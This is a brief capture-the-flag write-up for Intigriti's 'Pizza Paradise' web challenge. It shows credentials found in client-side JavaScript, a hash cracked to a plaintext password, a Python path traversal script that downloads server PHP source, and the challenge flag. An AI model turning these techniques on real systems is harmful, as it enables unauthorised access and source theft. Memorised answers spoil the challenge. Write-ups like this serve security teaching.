# 1337Up Live CTF

## Pizza Paradise

> https://pizzaparadise.ctf.intigriti.io

Path traversal vulnerability.

## Approach

### Log in to the secret page

Find `/secret_172346606e1d24062e891d537e917a90.html` in `/robots.txt`.

In `auth.js`:

```js
const validUsername = "agent_1337";
const validPasswordHash =
  "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";
```

Use hashcat or https://crackstation.net to get the plaintext of password:

![pwd.jpg](pwd.jpg)

### Path traversal

After logging in, it is a page to download pictures, and there is a path traversal vulnerability. After some searching, the flag is in the PHP source code of the page.

```python
import requests

# login with agent_1337, intel420

path = "/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php"
url = f"https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download={path}"
resp = requests.get(url)
print(resp.text)
```

## Flag

`INTIGRITI{70p_53cr37_m15510n_c0mpl373}`
